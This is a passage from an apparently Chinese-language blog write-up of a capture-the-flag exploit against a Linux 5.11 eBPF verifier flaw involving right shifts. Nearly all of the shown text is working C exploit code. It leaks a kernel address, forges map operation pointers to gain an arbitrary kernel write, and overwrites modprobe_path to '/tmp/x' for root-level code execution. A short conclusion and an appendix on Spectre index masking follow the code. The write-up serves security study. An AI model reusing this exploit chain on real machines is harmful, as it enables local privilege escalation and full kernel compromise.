    if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0){
        perror("setsockopt");
        exit(1);
    }
}
int arb_write(uint64_t addr, uint64_t val){
    int req = 1;

    update_map_element(store_map_fd, 0, &addr, BPF_ANY);
    update_map_element(info_map_fd, 0, &val, BPF_ANY);

    write(socks[1], &req, sizeof(req));

    return lookup_map_element(info_map_fd, 0, 0) == val;
}
char log_buf[0x10000];
char rosa_buf[0x100];
int main() {
    create_bpf_maps(); // 怪 现在在这里挂掉了因为 sys_bpf 直接返回负数 TODO 把.config 里面编译选项改了，需要重新把当前.config 拷贝到 ~/linux-5.11 里面然后重新 make
    // Create a BPF program to exploit the RSH vulnerability
    struct bpf_insn insns[] = {
        exploit_primitive_pt1(oob_map_fd, store_map_fd)
        // Return the leaked value
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    // Create BPF program
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)insns,
        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
        .license = (unsigned long long)"GPL",
        .log_buf = (unsigned long)log_buf,
        .log_size = 0x10000,
        .log_level = 2,
    };

    // Load the BPF program
    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    printf("content of log_buf:\n %s\n", log_buf);
    if (prog_fd < 0) {
        perror("Failed to load BPF program");
        return 1;
    }

    printf("Successfully loaded BPF program! FD: %d\n", prog_fd);
    attach_socket(prog_fd);
    printf("Successfully attached BPF program to socket!\n");
    int val = 0;
    write(socks[1], &val, sizeof(val));
    uint64_t kernel_leak = lookup_map_element(oob_map_fd, 0, rosa_buf);
    uint64_t map_addr = *((uint64_t*)rosa_buf + 1);
    uint64_t kernel_base = kernel_leak - 0x1019360 - 0x1d040;
    printf("Kernel base address: 0x%llx\n", kernel_base);
    uint64_t modprobe_path_addr = kernel_base + 0x1a6c240;

    printf("map_addr: 0x%llx\n", map_addr);
    uint64_t map_start = map_addr + 0x110 - 0xc0;

    // 0xffff888007858000 是我们的 map 结构体的位置
    // construct the fake array_map_ops struct check out where the struct is
    struct bpf_insn construct_array_map_ops[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        // setup fake bpf_map_ops struct with only needed values, r0 是 map_ptr + 0x110
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), // move map_ptr + 0x110
        BPF_MOV64_IMM(BPF_REG_0, kernel_base + 0x20eeb0),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x60),

        BPF_MOV64_IMM(BPF_REG_0, kernel_base + 0x20e830),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x58),

        BPF_MOV64_IMM(BPF_REG_0, kernel_base + 0x20e9c0), // array_of_map_gen_lookup
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 19 * 8), // this offset is right

        BPF_MOV64_IMM(BPF_REG_0, kernel_base + 0x20eff0), // array_map_free
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 3 * 8),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // trigger vuln
        BPF_MOV64_IMM(BPF_REG_0, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),

        BPF_LD_IMM64(BPF_REG_0, map_start),
        // overwrite map_ops with oob_map_ptr
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        // verification of the write: store BPF_REG_0 to the first element of the new map
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),
        // resume BPF_REG_7
        BPF_MOV64_IMM(BPF_REG_2, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_2, BPF_REG_1),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_2),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    union bpf_attr attr1 = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)construct_array_map_ops,
        .insn_cnt = sizeof(construct_array_map_ops) / sizeof(construct_array_map_ops[0]),
        .license = (unsigned long long)"GPL",
        .log_buf = (unsigned long)log_buf,
        .log_size = 0x10000,
        .log_level = 2,
    };
    prog_fd = bpf(BPF_PROG_LOAD, &attr1, sizeof(attr1));
    printf("here...\n");
    printf("strlen: %d\n",strlen(log_buf));
    for(int i = 0; i < strlen(log_buf);i++){
        putchar(log_buf[i]);
    }
    printf("\n");
    if (prog_fd < 0) {
        perror("Failed to load BPF program");
        return 1;
    }

    printf("Successfully loaded BPF program! FD: %d\n", prog_fd);
    attach_socket(prog_fd);
    printf("Successfully attached BPF program to socket!\n");
    val = 0;
    write(socks[1], &val, sizeof(val));
    // need an arbituary write to modprobe path
    uint64_t verification = lookup_map_element(store_map_fd, 0, rosa_buf);
    printf("verifying fake address: %llx\n", verification);
    // next have write to modprobe_path
    // the bpf program will be executed whenever a packet arrived

    struct bpf_insn arb_read_write[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, 0, -4),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), // will use array_of_map_gen_lookup

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0), // r8 is arb_read_write_map address

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, info_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // arb_write. load info_map_fd[0] to reg7 and store it in arb_read_write_map[0]
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    // attach socket
    union bpf_attr attr2 = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)arb_read_write,
        .insn_cnt = sizeof(arb_read_write) / sizeof(arb_read_write[0]),
        .license = (unsigned long long)"GPL",
        .log_buf = (unsigned long)log_buf,
        .log_size = 0x10000,
        .log_level = 2,
    };
    prog_fd = bpf(BPF_PROG_LOAD, &attr2, sizeof(attr2));
    // buffer
    for(int i = 0; i < strlen(log_buf);i++){
        putchar(log_buf[i]);
    }
    putchar(10);
    if (prog_fd < 0) {
        perror("Failed to load BPF program");
        return 1;
    }

    printf("Successfully loaded BPF program! FD: %d\n", prog_fd);
    attach_socket(prog_fd);

    arb_write(modprobe_path_addr,0x782f706d742f); // /tmp/x
    // trigger
    get_flag();
    printf("close the socket\n");
    close(socks[0]);
    close(socks[1]);
    close(prog_fd);

    return 0;
}
```
效果    
![alt_text](/assets/img/uploads/bpf_result.png)

![alt_text](/assets/img/uploads/bpf_flag.png)

### 结论
还是要主动积极多看 kernel 源码，来搞明白 how it works    

### appendix
以下为防护 spectre 的那个 bpf 代码中 how the index mask works 的介绍，credit to jiegec    
比如说有个 index, 合法范围为 0 ~ 3，判断范围时，是用的 `if(index >= 4) return FAIL;`的方式   
而如果 index 小于等于3就访问数组，但是可能因为分支预测，我们还是可以用大于等于4的index来访问数组    
为了解决这个问题，可以设置 index_mask = 3, 然后 index = index & index_mask, 这样访问数组是合法范围    
但是如果 index 的合法范围的长度不是2的幂次，则可能会有一点越界，但是其实问题不大，因为最后还是需要用户态通过 cache 测信道 leak，所以只要不会溢出到用户态可以 probe 的地址就也难被攻击    